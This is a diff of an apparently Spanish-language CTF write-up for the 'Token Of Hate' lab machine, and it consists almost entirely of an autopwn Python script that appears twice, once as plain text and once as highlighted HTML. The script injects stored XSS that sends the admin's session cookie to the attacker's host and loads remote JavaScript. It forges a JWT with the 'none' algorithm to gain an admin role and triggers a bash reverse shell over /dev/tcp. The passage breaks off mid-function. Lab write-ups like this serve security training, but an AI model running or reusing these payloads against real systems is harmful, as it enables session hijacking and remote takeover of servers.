@@ -10,186 +10,359 @@ description: Writeup de la máquina Token Of Hate de TheHackersLabs.
 
 <details>
   <summary>Haz click para ver el autopwned</summary>
- </details>
- ```python
- #!/usr/bin/env python3
+  <div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+</pre></td><td class="rouge-code"><pre> <span class="c1">#!/usr/bin/env python3
+</span>
+<span class="c1"># Author: Álvaro Bernal (aka. trr0r)
+</span>
+<span class="kn">import</span> <span class="n">requests</span><span class="p">,</span> <span class="n">signal</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">logging</span><span class="p">,</span> <span class="n">json</span><span class="p">,</span> <span class="n">jwt</span><span class="p">,</span> <span class="n">keyboard</span>
+<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="n">termcolor</span> <span class="kn">import</span> <span class="n">colored</span>
+<span class="kn">from</span> <span class="n">threading</span> <span class="kn">import</span> <span class="n">Thread</span>
+<span class="kn">from</span> <span class="n">multiprocessing</span> <span class="kn">import</span> <span class="n">Process</span><span class="p">,</span> <span class="n">Queue</span>
+<span class="kn">from</span> <span class="n">werkzeug</span> <span class="kn">import</span> <span class="n">Request</span><span class="p">,</span> <span class="n">Response</span><span class="p">,</span> <span class="n">run_simple</span>
+<span class="kn">from</span> <span class="n">base64</span> <span class="kn">import</span> <span class="n">b64encode</span><span class="p">,</span> <span class="n">b64decode</span>
 
-# Author: Álvaro Bernal (aka. trr0r)
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">80</span>
+<span class="n">LISTEN_NC</span> <span class="o">=</span> <span class="mi">443</span>
+<span class="n">target_ip</span> <span class="o">=</span> <span class="sh">""</span>
+<span class="n">host_ip</span> <span class="o">=</span> <span class="sh">""</span>
 
-import requests, signal, sys, time, logging, json, jwt, keyboard
-from pwn import *
-from termcolor import colored
-from threading import Thread
-from multiprocessing import Process, Queue
-from werkzeug import Request, Response, run_simple
-from base64 import b64encode, b64decode
+<span class="n">payload_cmd</span> <span class="o">=</span><span class="sh">'''</span><span class="s">x=new XMLHttpRequest;x.onload=()=&gt;new Image().src=</span><span class="sh">"</span><span class="s">http://%s:%i/?i=</span><span class="sh">"</span><span class="s">+btoa(x.responseText);x.open(</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">http://localhost:3000/command</span><span class="sh">"</span><span class="s">);x.setRequestHeader(</span><span class="sh">"</span><span class="s">Content-Type</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">application/json</span><span class="sh">"</span><span class="s">);x.send(</span><span class="sh">'</span><span class="s">{</span><span class="sh">"</span><span class="s">command</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="s">bash -c </span><span class="se">\\</span><span class="sh">'</span><span class="s">bash -i &gt;&amp; /dev/tcp/%s/%i 0&gt;&amp;1</span><span class="se">\\</span><span class="sh">'"</span><span class="s">, </span><span class="sh">"</span><span class="s">token</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s">}</span><span class="sh">'</span><span class="s">)</span><span class="sh">'''</span>
 
-PORT = 80
-LISTEN_NC = 443
-target_ip = ""
-host_ip = ""
+<span class="n">payload_token</span> <span class="o">=</span><span class="sh">'''</span><span class="s">x=new XMLHttpRequest;x.onload=()=&gt;new Image().src=</span><span class="sh">"</span><span class="s">http://%s:%i/info?i=</span><span class="sh">"</span><span class="s">+btoa(x.responseText);x.open(</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">http://localhost:3000/login</span><span class="sh">"</span><span class="s">);x.setRequestHeader(</span><span class="sh">"</span><span class="s">Content-Type</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">application/json</span><span class="sh">"</span><span class="s">);x.send(</span><span class="sh">'</span><span class="s">{</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="s">Jose</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="s">FuLqqEAErWQsmTQQQhsb</span><span class="sh">"</span><span class="s">}</span><span class="sh">'</span><span class="s">)</span><span class="sh">'''</span>
 
-payload_cmd ='''x=new XMLHttpRequest;x.onload=()=>new Image().src="http://%s:%i/?i="+btoa(x.responseText);x.open("POST","http://localhost:3000/command");x.setRequestHeader("Content-Type","application/json");x.send('{"command":"bash -c \\'bash -i >& /dev/tcp/%s/%i 0>&1\\'", "token":"%s"}')'''
+<span class="c1"># Ocultar el output
+</span><span class="n">loger</span> <span class="o">=</span> <span class="n">logging</span><span class="p">.</span><span class="nf">getLogger</span><span class="p">(</span><span class="sh">'</span><span class="s">werkzeug</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">loger</span><span class="p">.</span><span class="nf">setLevel</span><span class="p">(</span><span class="n">logging</span><span class="p">.</span><span class="n">ERROR</span><span class="p">)</span>
 
-payload_token ='''x=new XMLHttpRequest;x.onload=()=>new Image().src="http://%s:%i/info?i="+btoa(x.responseText);x.open("POST","http://localhost:3000/login");x.setRequestHeader("Content-Type","application/json");x.send('{"username":"Jose","password":"FuLqqEAErWQsmTQQQhsb"}')'''
+<span class="k">def</span> <span class="nf">get_ip</span><span class="p">():</span>
+    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="nf">colored</span><span class="p">(</span><span class="sh">"</span><span class="se">\n\t</span><span class="s">[+] Uso: validation_autopwn.py target_ip host_ip</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">blue</span><span class="sh">'</span><span class="p">))</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="p">[</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]]</span>
 
-# Ocultar el output
-loger = logging.getLogger('werkzeug')
-loger.setLevel(logging.ERROR)
+<span class="k">def</span> <span class="nf">ctrl_c</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">event</span><span class="p">):</span>
+    <span class="nf">print</span><span class="p">(</span><span class="nf">colored</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">[!] Saliendo ...</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">red</span><span class="sh">'</span><span class="p">))</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
-def get_ip():
-    if len(sys.argv) != 3:
-        print(colored("\n\t[+] Uso: validation_autopwn.py target_ip host_ip\n", 'blue'))
-        sys.exit(1)
-    else:
-        return [sys.argv[1], sys.argv[2]]
+<span class="n">signal</span><span class="p">.</span><span class="nf">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">ctrl_c</span><span class="p">)</span>
 
-def ctrl_c(key, event):
-    print(colored("\n[!] Saliendo ...\n", 'red'))
-    sys.exit(1)
+<span class="k">def</span> <span class="nf">check_connect</span><span class="p">():</span>
+    <span class="n">resultado</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">([</span><span class="sh">"</span><span class="s">timeout</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">ping</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">-c</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">,</span> <span class="n">target_ip</span><span class="p">],</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">resultado</span><span class="p">.</span><span class="n">returncode</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="nf">colored</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">[!] No tienes conectividad con la máquina víctima</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">red</span><span class="sh">'</span><span class="p">))</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
-signal.signal(signal.SIGINT, ctrl_c)
+<span class="k">def</span> <span class="nf">inject_cookie</span><span class="p">():</span>
+    <span class="n">main_url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">http://</span><span class="si">{</span><span class="n">target_ip</span><span class="si">}</span><span class="s">/procesarRegistro.php</span><span class="sh">"</span>
+    <span class="n">body_request</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="sh">"</span><span class="s">username</span><span class="sh">"</span> <span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="s">＜script＞let img＝document．createElement（＂img＂）；img．src＝＂http：／／</span><span class="si">{</span><span class="n">host_ip</span><span class="si">}</span><span class="s">：</span><span class="si">{</span><span class="n">PORT</span><span class="si">}</span><span class="s">／?cookie=＂+document．cookie＜／script＞</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">password</span><span class="sh">"</span> <span class="p">:</span> <span class="sh">"</span><span class="s">pwned</span><span class="sh">"</span>
+    <span class="p">}</span>
+    <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">main_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">body_request</span><span class="p">)</span>
 
-def check_connect():
-    resultado = subprocess.run(["timeout", "1", "ping", "-c", "1", target_ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-    if resultado.returncode != 0:
-        print(colored("\n[!] No tienes conectividad con la máquina víctima\n", 'red'))
-        sys.exit(1)
+<span class="k">def</span> <span class="nf">cookie_hijacking</span><span class="p">():</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span> <span class="c1"># Salto de línea simulado ya que el \n en el log.progress se bugea
+</span>    <span class="n">cookie_log</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="nf">progress</span><span class="p">(</span><span class="nf">colored</span><span class="p">(</span><span class="sh">"</span><span class="s">Capturando la cookie del admin</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">blue</span><span class="sh">'</span><span class="p">))</span>
+    <span class="k">with</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">server</span><span class="p">:</span>
+        <span class="n">server</span><span class="p">.</span><span class="nf">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+        <span class="n">server</span><span class="p">.</span><span class="nf">bind</span><span class="p">((</span><span class="n">host_ip</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
 
-def inject_cookie():
-    main_url = f"http://{target_ip}/procesarRegistro.php"
-    body_request = {
-        "username" : f"＜script＞let img＝document．createElement（＂img＂）；img．src＝＂http：／／{host_ip}：{PORT}／?cookie=＂+document．cookie＜／script＞",
-        "password" : "pwned"
-    }
-    requests.post(main_url, data=body_request)
+        <span class="n">server</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
-def cookie_hijacking():
-    print("") # Salto de línea simulado ya que el \n en el log.progress se bugea
-    cookie_log = log.progress(colored("Capturando la cookie del admin", 'blue'))
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
-        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        server.bind((host_ip, PORT))
+        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+            <span class="n">client</span><span class="p">,</span> <span class="n">client_addr</span> <span class="o">=</span> <span class="n">server</span><span class="p">.</span><span class="nf">accept</span><span class="p">()</span>
+            <span class="n">request</span> <span class="o">=</span> <span class="n">client</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">"</span><span class="s">utf-8</span><span class="sh">"</span><span class="p">)</span>
+            <span class="k">if</span> <span class="sh">"</span><span class="s">GET /?cookie</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">request</span> <span class="ow">and</span> <span class="n">target_ip</span> <span class="o">==</span> <span class="n">client_addr</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span>
+                <span class="n">cookie</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="nf">splitlines</span><span class="p">()[</span><span class="mi">0</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">PHPSESSID=</span><span class="sh">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s"> </span><span class="sh">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+                <span class="n">cookie_log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="nf">colored</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Cookie del usuario admin capturada, </span><span class="se">\"</span><span class="si">{</span><span class="n">cookie</span><span class="si">}</span><span class="se">\"</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">green</span><span class="sh">'</span><span class="p">))</span>
+                <span class="k">break</span>
+    <span class="k">return</span> <span class="n">cookie</span>
 
-        server.listen(1)
-
-        while True:
-            client, client_addr = server.accept()
-            request = client.recv(1024).decode("utf-8")
-            if "GET /?cookie" in request and target_ip == client_addr[0]:
-                cookie = request.splitlines()[0].split("PHPSESSID=")[-1].split(" ")[0]
-                cookie_log.success(colored(f"Cookie del usuario admin capturada, \"{cookie}\"", 'green'))
-                break
-    return cookie
-
-def inject_token():
-    main_url = f"http://{target_ip}/procesarRegistro.php"
-    body_request = {
-        "username" : f"＜script ｓｒｃ＝＂http：／／192.168.26.10:80／pwned．js＂＞＜／script＞",
-        "password" : "pwned2"
-    }
-    requests.post(main_url, data=body_request)
+<span class="k">def</span> <span class="nf">inject_token</span><span class="p">():</span>
+    <span class="n">main_url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">http://</span><span class="si">{</span><span class="n">target_ip</span><span class="si">}</span><span class="s">/procesarRegistro.php</span><span class="sh">"</span>
+    <span class="n">body_request</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="sh">"</span><span class="s">username</span><span class="sh">"</span> <span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="s">＜script ｓｒｃ＝＂http：／／192.168.26.10:80／pwned．js＂＞＜／script＞</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">password</span><span class="sh">"</span> <span class="p">:</span> <span class="sh">"</span><span class="s">pwned2</span><span class="sh">"</span>
+    <span class="p">}</span>
+    <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">main_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">body_request</span><span class="p">)</span>
 
 
-def get_token(q: Queue) -> None:
-    @Request.application
-    def app(request: Request) -> Response:
-        path = request.path.strip().lower()
-        if path.endswith("/pwned.js"):
-            with open("./pwned.js", "r") as f:
-                js_content = f.read()
-            return  Response(js_content, content_type='application/javascript')
-        elif path.endswith("/info"):
-            if "i" in request.args:  # Aseguramos que el parámetro "i" esté presente
-                q.put(request.args["i"])  # Poner el token en la cola
-        return Response("", 204)
+<span class="k">def</span> <span class="nf">get_token</span><span class="p">(</span><span class="n">q</span><span class="p">:</span> <span class="n">Queue</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
+    <span class="nd">@Request.application</span>
+    <span class="k">def</span> <span class="nf">app</span><span class="p">(</span><span class="n">request</span><span class="p">:</span> <span class="n">Request</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Response</span><span class="p">:</span>
+        <span class="n">path</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">strip</span><span class="p">().</span><span class="nf">lower</span><span class="p">()</span>
+        <span class="k">if</span> <span class="n">path</span><span class="p">.</span><span class="nf">endswith</span><span class="p">(</span><span class="sh">"</span><span class="s">/pwned.js</span><span class="sh">"</span><span class="p">):</span>
+            <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">./pwned.js</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">r</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+                <span class="n">js_content</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
+            <span class="k">return</span>  <span class="nc">Response</span><span class="p">(</span><span class="n">js_content</span><span class="p">,</span> <span class="n">content_type</span><span class="o">=</span><span class="sh">'</span><span class="s">application/javascript</span><span class="sh">'</span><span class="p">)</span>
+        <span class="k">elif</span> <span class="n">path</span><span class="p">.</span><span class="nf">endswith</span><span class="p">(</span><span class="sh">"</span><span class="s">/info</span><span class="sh">"</span><span class="p">):</span>
+            <span class="k">if</span> <span class="sh">"</span><span class="s">i</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">:</span>  <span class="c1"># Aseguramos que el parámetro "i" esté presente
+</span>                <span class="n">q</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">[</span><span class="sh">"</span><span class="s">i</span><span class="sh">"</span><span class="p">])</span>  <span class="c1"># Poner el token en la cola
+</span>        <span class="k">return</span> <span class="nc">Response</span><span class="p">(</span><span class="sh">""</span><span class="p">,</span> <span class="mi">204</span><span class="p">)</span>
 
-    run_simple("0.0.0.0", PORT, app)  # Iniciar el servidor en 0.0.0.0:PORT
+    <span class="nf">run_simple</span><span class="p">(</span><span class="sh">"</span><span class="s">0.0.0.0</span><span class="sh">"</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">app</span><span class="p">)</span>  <span class="c1"># Iniciar el servidor en 0.0.0.0:PORT
+</span>
+<span class="k">def</span> <span class="nf">run_flask_token</span><span class="p">():</span>
+    <span class="n">q</span> <span class="o">=</span> <span class="nc">Queue</span><span class="p">()</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="nc">Process</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">get_token</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">q</span><span class="p">,))</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
 
-def run_flask_token():
-    q = Queue()
-    p = Process(target=get_token, args=(q,))
-    p.start()
+    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span> <span class="c1"># Salto de línea simulado ya que el \n en el log.progress se bugea
+</span>    <span class="n">token_log</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="nf">progress</span><span class="p">(</span><span class="nf">colored</span><span class="p">(</span><span class="sh">"</span><span class="s">Capturando el token del usuario Jose</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">blue</span><span class="sh">'</span><span class="p">))</span>
+    <span class="n">token</span> <span class="o">=</span> <span class="n">q</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">block</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>  <span class="c1"># Esperar el token desde la cola
+</span>    <span class="n">token_log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="nf">colored</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Token del usuario Jose captuado, </span><span class="se">\"</span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="se">\"</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">green</span><span class="sh">'</span><span class="p">))</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">terminate</span><span class="p">()</span>  <span class="c1"># Terminar el servidor Flask
+</span>    <span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="nf">b64decode</span><span class="p">(</span><span class="n">token</span><span class="p">).</span><span class="nf">decode</span><span class="p">())[</span><span class="sh">"</span><span class="s">token</span><span class="sh">"</span><span class="p">],</span> <span class="n">options</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">verify_signature</span><span class="sh">"</span><span class="p">:</span> <span class="bp">False</span><span class="p">})</span>
+    <span class="n">token</span><span class="p">[</span><span class="sh">"</span><span class="s">role</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">admin</span><span class="sh">"</span>
+    <span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="sh">"</span><span class="s">none</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">token</span>
 
-    print("") # Salto de línea simulado ya que el \n en el log.progress se bugea
-    token_log = log.progress(colored("Capturando el token del usuario Jose", 'blue'))
-    token = q.get(block=True)  # Esperar el token desde la cola
-    token_log.success(colored(f"Token del usuario Jose captuado, \"{token}\"", 'green'))
-    p.terminate()  # Terminar el servidor Flask
-    token = jwt.decode(json.loads(b64decode(token).decode())["token"], options={"verify_signature": False})
-    token["role"] = "admin"
-    token = jwt.encode(token, key=None, algorithm="none")
-    return token
-
-def get_cmd(q: Queue) -> None:
-    @Request.application
-    def app(request: Request) -> Response:
-        path = request.path.strip().lower()
-        if path.endswith("/pwned.js"):
-            with open("./pwned.js", "r") as f:
-                js_content = f.read()
-            q.put("")
-            return Response(js_content, content_type='application/javascript')
-        return Response("", 204)
+<span class="k">def</span> <span class="nf">get_cmd</span><span class="p">(</span><span class="n">q</span><span class="p">:</span> <span class="n">Queue</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
+    <span class="nd">@Request.application</span>
+    <span class="k">def</span> <span class="nf">app</span><span class="p">(</span><span class="n">request</span><span class="p">:</span> <span class="n">Request</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Response</span><span class="p">:</span>
+        <span class="n">path</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">strip</span><span class="p">().</span><span class="nf">lower</span><span class="p">()</span>
+        <span class="k">if</span> <span class="n">path</span><span class="p">.</span><span class="nf">endswith</span><span class="p">(</span><span class="sh">"</span><span class="s">/pwned.js</span><span class="sh">"</span><span class="p">):</span>
+            <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">./pwned.js</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">r</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+                <span class="n">js_content</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
+            <span class="n">q</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span>
+            <span class="k">return</span> <span class="nc">Response</span><span class="p">(</span><span class="n">js_content</span><span class="p">,</span> <span class="n">content_type</span><span class="o">=</span><span class="sh">'</span><span class="s">application/javascript</span><span class="sh">'</span><span class="p">)</span>
+        <span class="k">return</span> <span class="nc">Response</span><span class="p">(</span><span class="sh">""</span><span class="p">,</span> <span class="mi">204</span><span class="p">)</span>
 
 
-    run_simple("0.0.0.0", PORT, app)  # Iniciar el servidor en 0.0.0.0:PORT
+    <span class="nf">run_simple</span><span class="p">(</span><span class="sh">"</span><span class="s">0.0.0.0</span><span class="sh">"</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">app</span><span class="p">)</span>  <span class="c1"># Iniciar el servidor en 0.0.0.0:PORT
+</span>
+<span class="k">def</span> <span class="nf">run_flask_cmd</span><span class="p">():</span>
+    <span class="n">q</span> <span class="o">=</span> <span class="nc">Queue</span><span class="p">()</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="nc">Process</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">get_cmd</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">q</span><span class="p">,))</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
 
-def run_flask_cmd():
-    q = Queue()
-    p = Process(target=get_cmd, args=(q,))
-    p.start()
+    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span> <span class="c1"># Salto de línea simulado ya que el \n en el log.progress se bugea
+</span>    <span class="n">token_log</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="nf">progress</span><span class="p">(</span><span class="nf">colored</span><span class="p">(</span><span class="sh">"</span><span class="s">Esperando a que el admin visite la página para que nos envie la Reverse Shell</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">blue</span><span class="sh">'</span><span class="p">))</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span> <span class="c1"># Salto de línea simulado ya que el \n en el log.progress se bugea
+</span>
+    <span class="nf">listening</span><span class="p">()</span> <span class="c1"># Nos ponemos en escucha
+</span>
+    <span class="n">q</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">block</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>  <span class="c1"># Esperar a que se realize la petición a /pwned.js
+</span>    <span class="n">p</span><span class="p">.</span><span class="nf">terminate</span><span class="p">()</span>  <span class="c1"># Terminar el servidor Flask
+</span>
+<span class="k">def</span> <span class="nf">write_pwned_js</span><span class="p">(</span><span class="n">content</span><span class="p">,</span> <span class="nb">type</span><span class="p">):</span>
 
-    print("") # Salto de línea simulado ya que el \n en el log.progress se bugea
-    token_log = log.progress(colored("Esperando a que el admin visite la página para que nos envie la Reverse Shell", 'blue'))
-    print("") # Salto de línea simulado ya que el \n en el log.progress se bugea
+    <span class="k">if</span> <span class="nb">type</span> <span class="o">==</span> <span class="sh">"</span><span class="s">t</span><span class="sh">"</span><span class="p">:</span>
+        <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">pwned.js</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">w</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">content</span> <span class="o">%</span> <span class="p">(</span><span class="n">host_ip</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
+    <span class="k">elif</span> <span class="nb">type</span> <span class="o">==</span> <span class="sh">"</span><span class="s">c</span><span class="sh">"</span><span class="p">:</span>
